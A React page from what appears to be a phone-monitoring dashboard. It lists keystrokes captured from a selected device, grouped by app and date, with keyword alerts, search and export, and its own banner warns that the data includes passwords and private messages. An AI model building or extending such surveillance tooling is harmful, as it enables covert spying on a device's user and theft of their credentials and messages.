"use client"

import { useState, useEffect, useCallback, useMemo } from "react"
import { format, parseISO, isValid, isToday, isYesterday } from "date-fns"
import {
  KeyRound, AlertTriangle, LayoutList, Table as TableIcon,
  ChevronDown, ChevronRight, Keyboard, AlertCircle, Download, Search,
  ShieldAlert
} from "lucide-react"
import { DateRange } from "react-day-picker"

import { DateRangeFilter } from "@/components/shared/date-range-filter"
import { PageHeader } from "@/components/shared/page-header"
import { ExportButton } from "@/components/shared/export-button"
import { DataTable, ColumnDef } from "@/components/shared/data-table"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { ScrollArea } from "@/components/ui/scroll-area"
import { Skeleton } from "@/components/ui/skeleton"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet"
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible"

import { useDeviceStore } from "@/lib/stores/device-store"
import { createClient } from "@/lib/supabase/client"
import { KeylogEntry } from "@/lib/types/database"
import { cn } from "@/lib/utils"

// Highlight keywords inside text
function highlightKeywords(text: string, keywords: string[]): React.ReactNode {
  if (!keywords.length || !text) return text

  const pattern = new RegExp(`(${keywords.map(k => k.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')).join('|')})`, 'gi')
  const parts = text.split(pattern)

  return (
    <>
      {parts.map((part, i) => {
        const isMatch = keywords.some(k => k.toLowerCase() === part.toLowerCase())
        return isMatch ? (
          <mark key={i} className="bg-rose-200 dark:bg-rose-800/60 text-rose-900 dark:text-rose-100 px-0.5 rounded font-semibold not-italic">
            {part}
          </mark>
        ) : part
      })}
    </>
  )
}

function dayLabel(dateStr: string): string {
  const d = parseISO(dateStr)
  if (!isValid(d)) return dateStr
  if (isToday(d)) return "Today"
  if (isYesterday(d)) return "Yesterday"
  return format(d, "EEEE, MMMM d, yyyy")
}

const APP_EMOJI: Record<string, string> = {
  chrome: "🌐", firefox: "🦊", whatsapp: "💬", facebook: "📘",
  instagram: "📷", telegram: "✈️", signal: "🔐", twitter: "🐦",
  gmail: "📧", youtube: "▶️", tiktok: "🎵", snapchat: "👻",
  settings: "⚙️", keyboard: "⌨️", messages: "💬", phone: "📞",
  contacts: "📒",
}

function appEmoji(name: string | null): string {
  if (!name) return "📱"
  const lower = name.toLowerCase()
  for (const [key, emoji] of Object.entries(APP_EMOJI)) {
    if (lower.includes(key)) return emoji
  }
  return "📱"
}

export default function KeyloggerPage() {
  const { selectedDeviceId } = useDeviceStore()

  const [data, setData] = useState<KeylogEntry[]>([])
  const [isLoading, setIsLoading] = useState(false)
  const [alertKeywords, setAlertKeywords] = useState<string[]>([])
  const [viewMode, setViewMode] = useState<"timeline" | "table">("timeline")

  const [dateRange, setDateRange] = useState<DateRange | undefined>()
  const [searchQuery, setSearchQuery] = useState("")
  const [appFilter, setAppFilter] = useState<string>("all")
  const [page, setPage] = useState(0)
  const PAGE_SIZE = 50

  const [selectedEntry, setSelectedEntry] = useState<KeylogEntry | null>(null)
  const [collapsedApps, setCollapsedApps] = useState<Set<string>>(new Set())

  // Fetch alert keywords from device_settings
  useEffect(() => {
    if (!selectedDeviceId) return
    const load = async () => {
      const supabase = createClient()
      const { data: settings } = await supabase
        .from("device_settings")
        .select("alert_keywords")
        .eq("device_id", selectedDeviceId)
        .single() as any
      if (settings?.alert_keywords) setAlertKeywords(settings.alert_keywords as string[])
    }
    load()
  }, [selectedDeviceId])

  const fetchData = useCallback(async () => {
    if (!selectedDeviceId) return
    setIsLoading(true)
    const supabase = createClient()

    let query = supabase
      .from("keylog_entries")
      .select("*")
      .eq("device_id", selectedDeviceId)
      .order("timestamp", { ascending: false })
      .range(page * PAGE_SIZE, (page + 1) * PAGE_SIZE - 1)

    if (dateRange?.from) query = query.gte("timestamp", dateRange.from.toISOString())
    if (dateRange?.to) query = query.lte("timestamp", dateRange.to.toISOString())
    if (appFilter !== "all") query = query.ilike("app_name", `%${appFilter}%`)

    const { data: result } = await query
    setData(prev => page === 0 ? (result as KeylogEntry[] || []) : [...prev, ...(result as KeylogEntry[] || [])])
    setIsLoading(false)
  }, [selectedDeviceId, dateRange, appFilter, page])

  useEffect(() => {
    setPage(0)
    setData([])
  }, [selectedDeviceId, dateRange, appFilter, searchQuery])

  useEffect(() => { fetchData() }, [fetchData])

  const filteredData = useMemo(() => {
    if (!searchQuery.trim()) return data
    const q = searchQuery.toLowerCase()
    return data.filter(d =>
      (d.text_content && d.text_content.toLowerCase().includes(q)) ||
      (d.app_name && d.app_name.toLowerCase().includes(q))
    )
  }, [data, searchQuery])

  const uniqueApps = useMemo(() => {
    const apps = new Set(data.map(d => d.app_name).filter(Boolean) as string[])
    return Array.from(apps).sort()
  }, [data])

  const keywordMatchCount = useMemo(() => {
    if (!alertKeywords.length) return 0
    return filteredData.filter(entry =>
      alertKeywords.some(kw => entry.text_content?.toLowerCase().includes(kw.toLowerCase()))
    ).length
  }, [filteredData, alertKeywords])

  // Group data by date then by app for timeline view
  const groupedByDate = useMemo(() => {
    const groups: Record<string, Record<string, KeylogEntry[]>> = {}
    for (const entry of filteredData) {
      const dateKey = isValid(parseISO(entry.timestamp)) ? format(parseISO(entry.timestamp), "yyyy-MM-dd") : "unknown"
      if (!groups[dateKey]) groups[dateKey] = {}
      const appKey = entry.app_name || "Unknown App"
      if (!groups[dateKey][appKey]) groups[dateKey][appKey] = []
      groups[dateKey][appKey].push(entry)
    }
    return groups
  }, [filteredData])

  const toggleAppCollapse = (key: string) => {
    setCollapsedApps(prev => {
      const next = new Set(prev)
      if (next.has(key)) next.delete(key)
      else next.add(key)
      return next
    })
  }

  const hasKeyword = (text: string) =>
    alertKeywords.some(kw => text?.toLowerCase().includes(kw.toLowerCase()))

  // Table columns
  const columns: ColumnDef<KeylogEntry>[] = [
    {
      key: "app_name",
      header: "App",
      width: "160px",
      render: (row) => (
        <div className="flex items-center gap-2">
          <span className="text-lg">{appEmoji(row.app_name)}</span>
          <span className="text-sm font-medium text-slate-700 dark:text-slate-300">{row.app_name || "Unknown"}</span>
        </div>
      )
    },
    {
      key: "text_content",
      header: "Typed Text",
      render: (row) => (
        <div className="flex items-center gap-2">
          {hasKeyword(row.text_content) && (
            <span title="Contains alert keyword" className="text-rose-500 shrink-0">🔴</span>
          )}
          <span className="text-sm font-mono text-slate-700 dark:text-slate-300 truncate max-w-[400px]">
            {row.text_content}
          </span>
        </div>
      )
    },
    {
      key: "timestamp",
      header: "Date / Time",
      width: "160px",
      render: (row) => {
        const d = parseISO(row.timestamp)
        return isValid(d) ? (
          <div className="flex flex-col">
            <span className="text-sm font-medium">{format(d, "MMM d, yyyy")}</span>
            <span className="text-xs text-slate-500">{format(d, "h:mm:ss a")}</span>
          </div>
        ) : <span>—</span>
      }
    }
  ]

  const exportColumns = [
    { key: "timestamp", header: "Date" },
    { key: "app_name", header: "App" },
    { key: "package_name", header: "Package" },
    { key: "text_content", header: "Typed Text" },
  ]

  if (!selectedDeviceId) {
    return (
      <div className="p-8 pb-20 animate-in fade-in">
        <PageHeader title="⌨️ Keylogger" />
        <Card className="flex flex-col items-center justify-center p-12 text-center border-dashed border-2">
          <AlertCircle className="h-10 w-10 text-amber-500 mb-4" />
          <h3 className="text-lg font-semibold mb-2">No Device Selected</h3>
          <p className="text-slate-500 max-w-sm">Select a device to view keylogger entries.</p>
        </Card>
      </div>
    )
  }

  return (
    <div className="space-y-4 animate-in fade-in pb-20">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-start justify-between gap-4">
        <PageHeader
          title="⌨️ Keylogger"
          description="All text typed on the device, grouped by app."
        />
        <div className="flex items-center gap-2">
          <ExportButton data={filteredData} columns={exportColumns} filename="keylog_entries" />
        </div>
      </div>

      {/* Warning Banner */}
      <div className="flex items-start gap-3 p-4 rounded-lg bg-amber-50 dark:bg-amber-950/30 border border-amber-200 dark:border-amber-800/50 text-amber-800 dark:text-amber-300">
        <AlertTriangle className="h-5 w-5 shrink-0 mt-0.5" />
        <p className="text-sm font-medium">
          Keylogger data may contain highly sensitive information such as passwords, private messages and PIN codes. Handle with care and ensure lawful usage.
        </p>
      </div>

      {/* Keyword Match Alert */}
      {alertKeywords.length > 0 && keywordMatchCount > 0 && (
        <div className="flex items-center gap-3 p-3 rounded-lg bg-rose-50 dark:bg-rose-950/30 border border-rose-200 dark:border-rose-800/50">
          <ShieldAlert className="h-5 w-5 text-rose-600 shrink-0" />
          <p className="text-sm font-semibold text-rose-700 dark:text-rose-300">
            🔴 {keywordMatchCount} {keywordMatchCount === 1 ? "entry" : "entries"} found containing alert keywords: {alertKeywords.map(k => `"${k}"`).join(", ")}
          </p>
        </div>
      )}

      {/* Filters Row */}
      <div className="flex flex-wrap gap-3 items-end">
        <DateRangeFilter date={dateRange} setDate={setDateRange} />

        <Select value={appFilter} onValueChange={(val) => setAppFilter(val || "all")}>
          <SelectTrigger className="w-[200px] h-9">
            <SelectValue placeholder="Filter by App" />
          </SelectTrigger>
          <SelectContent>
            <SelectItem value="all">All Apps</SelectItem>
            {uniqueApps.map(app => (
              <SelectItem key={app} value={app}>{app}</SelectItem>
            ))}
          </SelectContent>
        </Select>

        <div className="relative w-full sm:w-72">
          <Search className="absolute left-2.5 top-2.5 h-4 w-4 text-slate-400" />
          <Input
            placeholder="Search typed text..."
            className="pl-9 h-9"
            value={searchQuery}
            onChange={e => setSearchQuery(e.target.value)}
          />
        </div>

        {/* View Toggle */}
        <div className="flex items-center gap-1 ml-auto bg-slate-100 dark:bg-slate-800 rounded-lg p-1">
          <Button
            size="sm"
            variant={viewMode === "timeline" ? "default" : "ghost"}
            className="h-7 gap-1.5 text-xs"
            onClick={() => setViewMode("timeline")}
          >
            <LayoutList className="h-3.5 w-3.5" /> Timeline
          </Button>
          <Button
            size="sm"
            variant={viewMode === "table" ? "default" : "ghost"}
            className="h-7 gap-1.5 text-xs"
            onClick={() => setViewMode("table")}
          >
            <TableIcon className="h-3.5 w-3.5" /> Table
          </Button>
        </div>
      </div>

      {/* ── TIMELINE VIEW ── */}
      {viewMode === "timeline" && (
        <div className="space-y-6">
          {isLoading && page === 0 ? (
            <div className="space-y-4">
              {Array.from({ length: 5 }).map((_, i) => (
                <Card key={i} className="p-4 space-y-3">
                  <Skeleton className="h-4 w-40" />
                  <Skeleton className="h-12 w-full" />
                </Card>
              ))}
            </div>
          ) : filteredData.length === 0 ? (
            <Card className="flex flex-col items-center justify-center py-16 border-dashed">
              <Keyboard className="h-12 w-12 text-slate-300 mb-3" />
              <p className="text-sm font-medium text-slate-500">No keylog entries found.</p>
              <p className="text-xs text-slate-400 mt-1">Try adjusting your filters.</p>
            </Card>
          ) : (
            Object.entries(groupedByDate).map(([dateKey, appGroups]) => (
              <div key={dateKey} className="space-y-3">
                {/* Date Separator */}
                <div className="flex items-center gap-3">
                  <div className="flex-1 h-px bg-slate-200 dark:bg-slate-800"></div>
                  <span className="text-xs font-semibold text-slate-500 dark:text-slate-400 uppercase tracking-wider whitespace-nowrap">
                    {dayLabel(dateKey + "T00:00:00")}
                  </span>
                  <div className="flex-1 h-px bg-slate-200 dark:bg-slate-800"></div>
                </div>

                {/* App Groups */}
                {Object.entries(appGroups).map(([appName, entries]) => {
                  const groupKey = `${dateKey}-${appName}`
                  const isCollapsed = collapsedApps.has(groupKey)
                  const groupHasKeyword = entries.some(e => hasKeyword(e.text_content))

                  return (
                    <Card key={groupKey} className="overflow-hidden border shadow-sm">
                      <Collapsible open={!isCollapsed} onOpenChange={() => toggleAppCollapse(groupKey)}>
                        <CollapsibleTrigger className="w-full flex items-center gap-3 px-4 py-3 bg-slate-50/70 dark:bg-slate-900/50 hover:bg-slate-100 dark:hover:bg-slate-800/80 transition-colors border-b border-slate-200 dark:border-slate-800">
                            <span className="text-xl">{appEmoji(appName)}</span>
                            <div className="flex flex-col text-left flex-1 min-w-0">
                              <span className="text-sm font-semibold text-slate-800 dark:text-slate-200">{appName}</span>
                              <span className="text-xs text-slate-500">{entries.length} {entries.length === 1 ? "entry" : "entries"}</span>
                            </div>
                            {groupHasKeyword && (
                              <Badge variant="destructive" className="text-[10px] h-5">
                                🔴 Keyword Match
                              </Badge>
                            )}
                            {isCollapsed ? <ChevronRight className="h-4 w-4 text-slate-400 ml-2" /> : <ChevronDown className="h-4 w-4 text-slate-400 ml-2" />}
                        </CollapsibleTrigger>

                        <CollapsibleContent>
                          <div className="divide-y divide-slate-100 dark:divide-slate-800/70">
                            {entries.map((entry) => {
                              const entryHasKw = hasKeyword(entry.text_content)
                              const ts = parseISO(entry.timestamp)
                              return (
                                <button
                                  key={entry.id}
                                  onClick={() => setSelectedEntry(entry)}
                                  className={cn(
                                    "w-full text-left px-4 py-3 flex gap-3 items-start hover:bg-slate-50 dark:hover:bg-slate-900/40 transition-colors group",
                                    entryHasKw && "bg-rose-50/50 dark:bg-rose-950/20"
                                  )}
                                >
                                  <div className="w-5 flex-shrink-0 mt-0.5">
                                    {entryHasKw && <span title="Keyword detected" className="text-sm">🔴</span>}
                                  </div>
                                  <pre className="flex-1 text-sm font-mono text-slate-700 dark:text-slate-300 whitespace-pre-wrap break-all leading-relaxed text-left">
                                    {alertKeywords.length > 0
                                      ? highlightKeywords(entry.text_content, alertKeywords)
                                      : entry.text_content}
                                  </pre>
                                  <span className="text-[11px] text-slate-400 whitespace-nowrap shrink-0 mt-0.5 hidden sm:block">
                                    {isValid(ts) ? format(ts, "h:mm:ss a") : ""}
                                  </span>
                                </button>
                              )
                            })}
                          </div>
                        </CollapsibleContent>
                      </Collapsible>
                    </Card>
                  )
                })}
              </div>
            ))
          )}

          {/* Load More */}
          {filteredData.length >= (page + 1) * PAGE_SIZE && (
            <div className="flex justify-center">
              <Button variant="outline" onClick={() => setPage(p => p + 1)} disabled={isLoading}>
                {isLoading ? "Loading..." : "Load More"}
              </Button>
            </div>
          )}
        </div>
      )}

      {/* ── TABLE VIEW ── */}
      {viewMode === "table" && (
        <Card className="overflow-hidden border shadow-sm">
          <DataTable<KeylogEntry>
            data={filteredData}
            columns={columns}
            isLoading={isLoading}
            onRowClick={setSelectedEntry}
            emptyMessage="No keylog entries found."
            emptyIcon={<Keyboard className="h-10 w-10 mb-2 opacity-20" />}
            searchable={false}
          />
        </Card>
      )}

      {/* Detail Sheet */}
      <Sheet open={!!selectedEntry} onOpenChange={(o) => !o && setSelectedEntry(null)}>
        <SheetContent className="w-full sm:max-w-xl overflow-y-auto">
          <SheetHeader>
            <SheetTitle className="flex items-center gap-2">
              <span className="text-2xl">{appEmoji(selectedEntry?.app_name ?? null)}</span>
              {selectedEntry?.app_name || "Unknown App"}
            </SheetTitle>
          </SheetHeader>

          {selectedEntry && (
            <div className="mt-6 space-y-4">
              <div className="grid grid-cols-2 gap-3 text-sm">
                <div className="border rounded-lg p-3">
                  <span className="text-xs text-slate-500 block">App</span>
                  <span className="font-semibold">{selectedEntry.app_name || "Unknown"}</span>
                </div>
                <div className="border rounded-lg p-3">
                  <span className="text-xs text-slate-500 block">Package</span>
                  <span className="font-semibold text-xs break-all">{selectedEntry.package_name || "—"}</span>
                </div>
                <div className="border rounded-lg p-3 col-span-2">
                  <span className="text-xs text-slate-500 block">Timestamp</span>
                  <span className="font-semibold">
                    {isValid(parseISO(selectedEntry.timestamp)) ? format(parseISO(selectedEntry.timestamp), "PPpp") : "—"}
                  </span>
                </div>
              </div>

              {hasKeyword(selectedEntry.text_content) && (
                <div className="flex items-center gap-2 p-3 rounded-lg bg-rose-50 dark:bg-rose-950/30 border border-rose-200 dark:border-rose-800/50">
                  <ShieldAlert className="h-4 w-4 text-rose-600 shrink-0" />
                  <span className="text-sm font-medium text-rose-700 dark:text-rose-300">Alert keyword detected in this entry.</span>
                </div>
              )}

              <div className="border rounded-lg p-4">
                <span className="text-xs text-slate-500 block mb-3">Typed Content</span>
                <pre className="text-sm font-mono text-slate-800 dark:text-slate-200 whitespace-pre-wrap break-all leading-relaxed bg-slate-50 dark:bg-slate-900 p-3 rounded-md border">
                  {alertKeywords.length > 0
                    ? highlightKeywords(selectedEntry.text_content, alertKeywords)
                    : selectedEntry.text_content}
                </pre>
              </div>
            </div>
          )}
        </SheetContent>
      </Sheet>
    </div>
  )
}
